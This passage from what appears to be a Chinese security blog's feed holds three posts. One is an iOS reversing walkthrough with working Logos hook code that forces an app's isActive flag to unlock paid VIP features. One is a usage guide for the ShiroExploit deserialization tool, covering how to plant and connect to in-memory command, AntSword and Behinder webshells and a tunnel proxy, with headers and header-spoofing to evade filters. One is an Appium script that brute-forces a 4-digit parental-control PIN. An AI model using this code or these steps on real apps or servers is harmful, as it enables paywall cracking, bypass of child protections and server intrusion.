href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="noopener">https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85</a></p><p>安装完成后新建MonkeyApp</p><p><img src="17.png" alt="新建MonkeyApp"></p><p>输入项目名称</p><img src="18.png" alt="项目名称" style="zoom: 50%;"><p>项目建立后将砸壳后的APP拖入到TargetApp目录下。</p><img src="19.png" alt="放入TargetApp目录下" style="zoom:50%;"><p>这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%hook 类名</span><br><span class="line">- (返回值)方法名:(id)arg1 ....</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>这里我们需要对CommonUtil 类的方法isActive进行HOOK，修改返回值，代码如图所示。</p><p><img src="20.png" alt="hook"></p><p>连接非越狱手机后使用<code>⌘+R</code>运行该项目，手机上会多出来一个名字一样的APP。理论上来讲该APP可以使用其<code>VIP</code>功能。</p><blockquote><p>首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书。</p></blockquote><img src="21.png" alt="非越狱设备运行" style="zoom: 33%;"><p>然而此时只能使用<code>VIP</code>的部分功能，可以使用会员背景，但是无法添加超过2个<code>习惯</code>和<code>目标</code>类代办。此时才发现在使用frida进行hook的时候，测试添加多个习惯类代办时添加了两个<code>习惯</code>，一个<code>目标</code>，因此给出了可以使用全部<code>VIP</code>功能的结论。</p><p>通过关键字定位到<code>-[AddTodoController confirm]</code>方法。</p><p><img src="22.png" alt="定位代办"></p><p>发现添加超过2个<code>习惯</code>和<code>目标</code>类代办需要判断GVUserDefaults的isActive是否为真。</p><p>而且查看<code>+[CommonUtil isActive]</code>方法，其返回结果也是获取的<code>GVUserDefaults</code>isActive属性的值。</p><p><img src="23.png" alt="CommonUtil isActive方法"></p><p>对<code>+[GVUserDefaults standardUserDefaults]</code>进行hook，修改其isActive属性。</p><p>代码如下：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">GVUserDefaults</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>) _Bool isActive;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line">%hook GVUserDefaults</span><br><span class="line"></span><br><span class="line">+ (<span class="keyword">id</span>)standardUserDefaults&#123;</span><br><span class="line">    GVUserDefaults *gvUser = %orig();</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@"GVUserDefaults isActive old----&gt;%d"</span>,[gvUser isActive]);</span><br><span class="line">    [gvUser setIsActive:<span class="literal">true</span>];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@"GVUserDefaults isActive new----&gt;%d"</span>,[gvUser isActive]);</span><br><span class="line">    <span class="keyword">return</span> gvUser;</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>执行结果</p><img src="24.png" alt="hook standardUserDefaults" style="zoom:50%;"><p>此时可以使用超过2个<code>习惯</code>和<code>目标</code>类以及使用全部的背景功能。</p><img src="25.png" alt="解锁全部VIP功能" style="zoom: 33%;"><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本文通过一个简单的APP逆向，实现了越狱绕过以及解锁VIP会员功能。简单的介绍了一下相关工具的使用。关于越狱绕过，该APP越狱检测的方法很简单，只是判断了文件是否存在。其他检测的方式有：可以尝试读取系统所有的应用名称列表，看有无权限获取；检测stat是否出自系统库等。更多检测方式可以参考<a href="https://kingdomrain002.github.io/2019/01/14/iOS开发-安全相关-越狱检测/" target="_blank" rel="noopener">iOS开发-安全相关-越狱检测</a> 。</p><p>对于该APP使用体验来讲，免费版功能已经够用了，而且无广告，如果有需要的可以开通季度卡，解锁更多功能。</p>]]></content>
      
      
      <categories>
          
          <category> IOS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS逆向 </tag>
            
            <tag> frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShiroExploit使用指南</title>
      <link href="/2020/11/27/ShiroExploit-Readme/"/>
      <url>/2020/11/27/ShiroExploit-Readme/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>一款关于Shiro 1.2.4反序列化漏洞利用的回显工具。最新版本为v2.4。</p><a id="more"></a><blockquote><p>v2.4与v2.3相差不大，使用v2.3即可。</p><p>v2.3下载地址：<a href="https://github.com/fupinglee/JavaTools/blob/master/Shiro/ShiroExploit-v2.3.jar" target="_blank" rel="noopener">https://github.com/fupinglee/JavaTools/blob/master/Shiro/ShiroExploit-v2.3.jar</a><br>v2.3使用说明：<a href="https://github.com/fupinglee/JavaTools/blob/master/Shiro/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E-v2.3.pdf" target="_blank" rel="noopener">https://github.com/fupinglee/JavaTools/blob/master/Shiro/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E-v2.3.pdf</a></p></blockquote><p><strong>支持：</strong></p><p> 1.支持Tomcat7、Tomcat8、Tomcat9下的回显。</p><p> 2.支持Tomcat7、Tomcat8、Tomcat9下内存cmd马的写入与卸载。</p><p> 执行成功访问的URL为<a href="http://ip:port/xxx?labCmd=[命令]&amp;pwd=[密码]。">http://ip:port/xxx?labCmd=[命令]&amp;pwd=[密码]。</a></p><p> 3.支持Tomcat7、Tomcat8、Tomcat9下蚁剑内存shell的写入与卸载(请用蚁剑连接，连接类型CUSTOM)。 </p><p>执行成功后连接的URL为<a href="http://ip:port/xxx?ver=[任意字符串]。">http://ip:port/xxx?ver=[任意字符串]。</a></p><p> 4.支持Tomcat7、Tomcat8、Tomcat9下冰蝎内存shell的写入与卸载(请用蚁剑连接，连接类型JSP)。</p><p> 执行成功后连接的URL为<a href="http://ip:port/xxx。">http://ip:port/xxx。</a></p><p>5.新增配置中心，支持自定义UA和x-forwarded-for；新增内存代理Tunnel，新增AES-GCM加密方式的支持，新增一键卸载所有内存SHELL。</p><blockquote><p>以上发送请求时均需带上自定义的header：Accept-Header:[自定义的Accept-Header内容]</p></blockquote><p>下面具体说一下各个功能的使用方法，主要是介绍命令执行的使用方法。</p><h2 id="0x02-使用说明"><a href="#0x02-使用说明" class="headerlink" title="0x02 使用说明"></a>0x02 使用说明</h2><p>一共有三个功能模块，分别是KEY检测、命令执行和配置中心。</p><h3 id="KEY检测"><a href="#KEY检测" class="headerlink" title="KEY检测"></a>KEY检测</h3><p><img src="key%E6%A3%80%E6%B5%8B.png" alt="回显"></p><p>这一部分功能说明可以参考<a href="https://github.com/fupinglee/ShiroScan。" target="_blank" rel="noopener">https://github.com/fupinglee/ShiroScan。</a></p><p><strong>新增AES-GCM加密方式。</strong></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行中一共有回显、内存shell和卸载这三块。</p><h4 id="回显"><a href="#回显" class="headerlink" title="回显"></a><strong>回显</strong></h4><p>输入正确的key，选择正确的Gadget即可。支持Tomcat6、7、8、9以及SpringBoot下的通用回显。</p><p><img src="01.png" alt="回显"></p><h4 id="内存shell"><a href="#内存shell" class="headerlink" title="内存shell"></a><strong>内存shell</strong></h4><p>这个一共有6个选择，分别是<strong>CMDSHELL</strong>、<strong>EvilObject</strong>、<strong>[蚁剑]蚁剑SHELL</strong>、<strong>[蚁剑]冰蝎SHELL</strong>、<strong>[蚁剑]冰蝎SHELL[SpringBoot]</strong>、<strong>Tunnel</strong>。</p><p>常用的有<strong>CMDSHELL</strong>、<strong>[蚁剑]蚁剑SHELL</strong>、<strong>[蚁剑]冰蝎SHELL</strong>、<strong>[蚁剑]冰蝎SHELL[SpringBoot]</strong>、<strong>Tunnel</strong> 5个，EvilObject在这里只是为了写入蚁剑SHELL和Tunnel而用的，暂时没有单独使用的机会，所以这里就不对其进行功能介绍了。</p><p><img src="25.png" alt="内存shell"></p><blockquote><p>内存Shell都是采用的Filter，因此连接或者使用时，可以使用任意路径，只需配置好指定的Header与密码。</p></blockquote><h5 id="1-CMDSHELL"><a href="#1-CMDSHELL" class="headerlink" title="1.CMDSHELL"></a>1.CMDSHELL</h5><p><img src="03.png" alt="CMDSHELL"></p><p>可以自定义密码和请求头，都是必须的。</p><p>保存完毕后点击开始按钮。</p><p><img src="04.png" alt="CMDshell"></p><p>执行的效果：</p><p><img src="05.png" alt="CMDshell"></p><p>只有在密码、和header都正确且存在的情况下，才会执行命令，否则返回正常的页面。</p><h5 id="2-蚁剑-蚁剑shell"><a href="#2-蚁剑-蚁剑shell" class="headerlink" title="2.[蚁剑]蚁剑shell"></a>2.[蚁剑]蚁剑shell</h5><p><img src="06.png" alt="蚁剑shell"></p><p>输入密码和Header保存后点击开始按钮，会将蚁剑Shell Filter加载进去</p><p><img src="07.png" alt="蚁剑shell"></p><p>使用蚁剑连接</p><p><img src="08.png" alt="蚁剑shell"></p><p>一共有三个需要注意的地方。</p><p>1.URL中需要有ver参数</p><p>2.连接类型为CUSTOM</p><p>3.需要添加Header，Name为Accept-Header，Value是自己设置的值</p><p>这三个都需要且正确，否则会连接不成功。</p><p><img src="09.png" alt="蚁剑shell"></p><h5 id="3-蚁剑-冰蝎shell"><a href="#3-蚁剑-冰蝎shell" class="headerlink" title="3.[蚁剑]冰蝎shell"></a>3.[蚁剑]冰蝎shell</h5><h6 id="a-Tomcat环境下"><a href="#a-Tomcat环境下" class="headerlink" title="a)Tomcat环境下"></a>a)Tomcat环境下</h6><p><img src="10.png" alt="冰蝎shell"></p><p>输入密码和Header保存后点击开始按钮，会将冰蝎Shell Filter加载进去</p><p><img src="11.png" alt="冰蝎shell"></p><p>这里的话需要使用新版的<strong>蚁剑</strong>来连接，冰蝎是无法连接此shell的，所以类型为<code>[蚁剑]冰蝎SHELL</code>。</p><p>不过最新版的蚁剑也是无法连接的，需要自己从<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword</a> 下载代码，然后覆盖到自己的蚁剑目录才可以，作者已经更新了代码，但是还没有发布，需要自己下载后替换文件即可。</p><p><img src="12.png" alt="冰蝎shell"></p><p><img src="13.png" alt="冰蝎shell"></p><p>连接冰蝎shell也需要注意三点。</p><p>1.需要从github下载代码替换蚁剑客户端</p><p>2.连接类型为JSP</p><p>3.需要添加Header，Name为Accept-Header，Value是自己设置的值</p><p>否则也是无法连接的，这里就不演示了。</p><h6 id="b-SpringBoot环境下"><a href="#b-SpringBoot环境下" class="headerlink" title="b)SpringBoot环境下"></a>b)SpringBoot环境下</h6><p>支持回显与冰蝎shell</p><p><img src="20.png" alt="SpringBoot下回显"></p><p><img src="21.png" alt="Springboot下写入冰蝎内存shell"></p><p>连接时需要利用修改的蚁剑模版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;fupinglee&#x2F;AntSword-JSP-Template</span><br><span class="line">cd AntSword-JSP-Template</span><br><span class="line">.&#x2F;build.sh</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/AntSwordProject/AntSword-JSP-Template/pull/1" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-JSP-Template/pull/1</a></p></blockquote><p>然后将dist下的文件替换</p><p><code>AntSwordData/antSword-master/source/core/jsp/template</code></p><p>中的文件，然后重启蚁剑客户端。</p><p>修改前连接500错误</p><p><img src="22.png" alt="Springboot下写入冰蝎内存shell"></p><p>修改后正常连接</p><p><img src="23.png" alt="Springboot下写入冰蝎内存shell"></p><p>蚁剑连接</p><p><img src="24.png" alt="Springboot下写入冰蝎内存shell"></p><h5 id="4-Tunnel"><a href="#4-Tunnel" class="headerlink" title="4.Tunnel"></a>4.Tunnel</h5><p>内存代理shell。</p><p><img src="26.png" alt="新增Tunnel内存代理"></p><p>这里就不需要密码了，因此密码框是无法编辑的。</p><p><img src="27.png" alt="新增Tunnel内存代理"></p><blockquote><p>注意这里是Cache-Header</p></blockquote><p><img src="28.png" alt="新增Tunnel内存代理"></p><p>使用原版的reGeorgSocksProxy.py是无法连接的。</p><p><img src="29.png" alt="Tunnel内存代理"></p><p>需要加上自定义的Cache-Header，这里是<code>&quot;Cache-Header&quot;:&quot;thisIsMyJob!@&quot;</code>。</p><p>也可以直接使用<a href="https://github.com/fupinglee/MyPython/blob/master/tools/reGeorgSocksProxy_MMShell.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/tools/reGeorgSocksProxy_MMShell.py</a> </p><blockquote><p>注意使用时需要替换自己的Cache-Header的值。</p></blockquote><p>修改后运行</p><p><img src="30.png" alt="Tunnel内存代理"></p><h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><p>卸载的意思就是将Filter移除掉。</p><p>这里用cmdshell为例</p><p><img src="14.png" alt="卸载内存shell"></p><p>选择类型后确定，然后点击开始按钮</p><p><img src="15.png" alt="卸载内存shell"></p><p>cmdshell即被卸载</p><p><img src="16.png" alt="卸载内存shell"></p><p><strong>新增了一键卸载的命令。</strong></p><p><img src="31.png" alt="一键卸载内存shell"></p><p>会一次将所有写入的内存shell都给卸载。</p><h4 id="更新密码"><a href="#更新密码" class="headerlink" title="更新密码"></a>更新密码</h4><p>如何更新shell密码</p><p>仍以cmdshell为例，其他的一样的操作，都是重新加载一次内存shell即可。</p><p>首先加载一个cmdshell</p><p><img src="17.png" alt="修改密码"></p><p>修改密码是选择内存shell，然后选择shell类型，输入密码和自定义的header</p><p><img src="18.png" alt="修改密码"></p><p>修改密码为cmd2,原来的密码已经失效了</p><p><img src="19.png" alt="修改密码"></p><p>新的密码可以执行命令。</p><h3 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h3><p><img src="32.png" alt="配置中心"></p><p>配置中心可以使用代理和自定义UA、X-Forwarded-For，保存后立即生效。</p><blockquote><p>在两次实例中遇到了通过修改UA或X-Forwarded-For绕过限制执行命令的情况，因此增加了这个功能。</p></blockquote><h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><p><strong>仅供安全人员进行有授权的验证,勿用于非法测试。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shiro反序列化回显工具 </tag>
            
            <tag> 内存shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自动化测试工具Appium初探</title>
      <link href="/2020/05/29/Test-Automation-Using-Appium/"/>
      <url>/2020/05/29/Test-Automation-Using-Appium/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>前段时间由于给小破站开启了青少年模式，结果密码给忘记了。导致只能看一些学习课堂和书法之类的相关视频。虽然有找回密码选项，但是找回密码需要发送本人手持身份证的照片。而后在输入密码的时候试了多次，除了提示”密码输入错误，请重试”外，没有其他限制，也没有网络请求。由于是4位的数字密码，我想如果我写个自动输入密码的脚本，利用生成<code>0000</code>~<code>9999</code>的密码字典，应该就可以找到正确的密码。</p><a id="more"></a><p>经搜索发现，IOS自动化的框架有很多，如UIAutomation、XCTest、KIF、APPium等。其中UIAutomation和APPium无需源码就可以进行测试，而且APPium支持多种语言，所以这里我选择了<a href="http://appium.io/" target="_blank" rel="noopener">APPium</a>。</p><h2 id="0x02-环境搭建与自动化测试"><a href="#0x02-环境搭建与自动化测试" class="headerlink" title="0x02 环境搭建与自动化测试"></a>0x02 环境搭建与自动化测试</h2><h3 id="Appium相关介绍"><a href="#Appium相关介绍" class="headerlink" title="Appium相关介绍"></a>Appium相关介绍</h3><p>Appium 是一个开源工具，用于自动化 iOS 手机、 Android 手机和 Windows 桌面平台上的原生、移动 Web 和混合应用。 它使用WebDriver协议驱动iOS，Android和Windows应用程序。Appium 是跨平台的：它允许用同样的 API 对多平台（iOS、Android、Windows）写测试，做到在 iOS、Android 和 Windows 测试套件之间复用代码。而且支持多种语言，java、python、php、Ruby等等。</p><p>我这里是在MacOS系统下进行的测试，采用了手机版本为13.5.1（IOS真机），开发语言选择了Python3.8。</p><p>下面就开始搭建环境进行测试吧。</p><p>首先是APPium的安装。</p><h3 id="APPium相关安装"><a href="#APPium相关安装" class="headerlink" title="APPium相关安装"></a>APPium相关安装</h3><p>如果没有安装Homebrew，则需要先安装<a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>安装node</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install node</span><br></pre></td></tr></table></figure><p>安装相关依赖与软件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">npm install -g appium <span class="comment"># 安装appium</span></span><br><span class="line">npm install wd</span><br><span class="line">npm install -g appium-doctor</span><br><span class="line">npm i -g mjpeg-consumer</span><br><span class="line">brew install ios-deploy</span><br><span class="line">brew install carthage</span><br><span class="line">brew install lyft/formulae/<span class="built_in">set</span>-simulator-location</span><br><span class="line">npm i -g opencv4nodejs</span><br><span class="line">brew tap facebook/fb</span><br><span class="line">brew install idb-companion</span><br><span class="line">pip install fb-idb</span><br><span class="line">brew tap wix/brew</span><br><span class="line">brew install applesimutils</span><br></pre></td></tr></table></figure><blockquote><p>安装的话根据可以参考<a href="http://appium.io/docs/en/about-appium/getting-started/" target="_blank" rel="noopener">http://appium.io/docs/en/about-appium/getting-started/</a> 进行安装。</p><p>也可以直接安装appium桌面程序<a href="https://github.com/appium/appium-desktop/releases" target="_blank" rel="noopener">https://github.com/appium/appium-desktop/releases</a> 。</p></blockquote><p>安装后执行<code>appium-doctor --ios</code>指令，可以查看与iOS相关配置是否完整。</p><p>如果有哪一项是打叉的，则根据安装说明进行安装就可以了。</p><p><img src="02.png" alt></p><p>下图是全部配置都成功的情况。</p><p><img src="01.png" alt></p><p>由于需要在真机下进行测试所以还需要配置<a href="https://github.com/facebookarchive/WebDriverAgent" target="_blank" rel="noopener">WebDriverAgent</a>。</p><h3 id="配置WebDriverAgent"><a href="#配置WebDriverAgent" class="headerlink" title="配置WebDriverAgent"></a>配置WebDriverAgent</h3><p>下载<a href="https://github.com/facebookarchive/WebDriverAgent" target="_blank" rel="noopener">WebDriverAgent</a>。</p><p>进入到WebDriverAgent目录，然后执行<code>./Scripts/bootstrap.sh</code>下载安装依赖库。</p><p><img src="03.png" alt></p><p>双击<code>WebDriverAgent.xcodeproj</code>使用xcode打开WebDriverAgent项目</p><p>配置<code>WebDriverAgentLib</code>、<code>WebDriverAgentRunner</code>以及<code>IntegrationApp</code>的开发者信息</p><p><img src="04.png" alt></p><p>发现有错误，接下来修改<code>WebDriverAgentRunner</code>和<code>IntegrationApp</code>的<code>Bundle identifier</code>。</p><p><img src="05.png" alt="修改WebDriverAgentRunner"></p><p><img src="06.png" alt="修改IntegrationApp"></p><p>修改后发现无报错信息。然后数据线连接真机，进行安装。</p><p>发现编译失败，将 <code>assign</code> 改成 <code>unsafe_unretained</code> ，然后重新使用<code>command + u</code>进行编译安装测试。</p><p><img src="07.png" alt></p><p>然后访问<code>http://手机IP:8100</code>。如<a href="http://172.20.10.1:8100/status" target="_blank" rel="noopener">http://172.20.10.1:8100/status</a> 。</p><p><img src="08.png" alt></p><blockquote><p>需要手机与电脑处于同一网络下，我这里为了测试，电脑连接的是手机的热点。</p></blockquote><p>此时WebDriverAgent配置成功。如果在Appium中使用时，还需替换Appium中的WebDriverAgent。</p><p>我这里的路径为<code>/Applications/Appium.app/Contents/Resources/app/node_modules/appium/node_modules/appium-xcuitest-driver/node_modules/WebDriverAgent</code></p><p>直接替换即可，或者直接修改Appium中的WebDriverAgent，效果一样。</p><p>接下来就是自动化脚本的编写。</p><h3 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h3><p>可以通过使用Appium应用程序查看IOS元素特征。启动Appium，左上角菜单栏选择<code>APPium</code>-<code>New Session Window...</code>(或者快捷键<code>command+N</code>)。</p><p><img src="09.png" alt></p><p>填写对应的启动参数。</p><p>一些必要的参数：</p><ul><li>platformName是测试平台的名称，是ios或者Android。</li><li>udid在ios真机测试时需要，可以通过<code>ios-deploy --list_bundle_id</code>查询</li><li>bundleId需测试程序的bundle id,可以通过<code>ios-deploy --list_bundle_id</code>查询</li></ul><p>配置完成后，点击<code>Start Session</code>，手机会自动打开<code>哔哩哔哩</code>APP。</p><p><img src="10.png" alt></p><p>可以利用xpath获取元素并进行输入、点击等一系列操作。接下来就可以通过使用Python脚本来进行自动化测试了。</p><p>需要安装appium的python依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Appium-Python-Client</span><br></pre></td></tr></table></figure><p>启动APP的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver <span class="comment">#pip install Appium-Python-Client</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'iOS'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'13.5.1'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'xiamo6'</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'XCUITest'</span></span><br><span class="line">    desired_caps[<span class="string">'udid'</span>] = <span class="string">'8d4************a3'</span></span><br><span class="line">    desired_caps[<span class="string">'bundleId'</span>] = <span class="string">'tv.danmaku.bilianime'</span></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="11.gif" alt="运行效果"></p><p>接下来需要进入到输入密码界面，依次需要点击<code>我的-青少年模式-修改密码（或者关闭青少年模式）</code>。</p><p>利用脚本实现就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">"我的"</span>).click()</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeStaticText[@name=\"青少年模式\"]"</span>).click()</span><br><span class="line">driver.find_element_by_id(<span class="string">"关闭青少年模式"</span>).click()</span><br></pre></td></tr></table></figure><p>运行效果如下</p><p><img src="12.gif" alt="运行效果"></p><blockquote><p>如果是已经打开app 40分钟，或者非正常时段，则直接显示的是输入密码界面。</p></blockquote><p><img src="12.png" alt="运行效果"></p><p>可以利用xpath获取密码输入框元素，输入密码后并点击“立即验证”按钮，主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">driver.set_value(driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[1]"</span>),pwd[<span class="number">0</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[2]"</span>).send_keys(pwd[<span class="number">1</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[3]"</span>).send_keys(pwd[<span class="number">2</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[4]"</span>).send_keys(pwd[<span class="number">3</span>])</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"立即验证\"]"</span>).click()</span><br></pre></td></tr></table></figure><p>完整的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver <span class="comment">#pip install Appium-Python-Client</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    desired_caps = dict()</span><br><span class="line">    desired_caps[<span class="string">'platformName'</span>] = <span class="string">'iOS'</span></span><br><span class="line">    desired_caps[<span class="string">'platformVersion'</span>] = <span class="string">'13.5.1'</span></span><br><span class="line">    desired_caps[<span class="string">'deviceName'</span>] = <span class="string">'xiamo6'</span></span><br><span class="line">    desired_caps[<span class="string">'automationName'</span>] = <span class="string">'XCUITest'</span></span><br><span class="line">    desired_caps[<span class="string">'udid'</span>] = <span class="string">'8d4904454b********552e976a3'</span></span><br><span class="line">    desired_caps[<span class="string">'bundleId'</span>] = <span class="string">'tv.danmaku.bilianime'</span></span><br><span class="line">    driver = webdriver.Remote(<span class="string">'http://localhost:4723/wd/hub'</span>, desired_caps)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">5091</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwd = str(p)</span><br><span class="line">            driver.set_value(driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[1]"</span>),pwd[<span class="number">0</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[2]"</span>).send_keys(pwd[<span class="number">1</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[3]"</span>).send_keys(pwd[<span class="number">2</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeStaticText[4]"</span>).send_keys(pwd[<span class="number">3</span>])</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//XCUIElementTypeButton[@name=\"立即验证\"]"</span>).click()</span><br><span class="line">            print(pwd,<span class="string">'error'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            print(pwd,<span class="string">'is right'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">     driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行效果</p><p><img src="13.gif" alt="运行效果"></p><p>由上面执行的结果来看，每次输入前都会等待一会再输入，所以看起来速度很慢。</p><p><img src="14.png" alt="运行效果"></p><p>通过找到上图标记的<code>XCUIElementTypeOther</code>，然后使用<code>Send Keys</code>直接传入一个四位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">"//*/XCUIElementTypeWindow[1]/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther/XCUIElementTypeOther"</span>).send_keys(pwd)</span><br><span 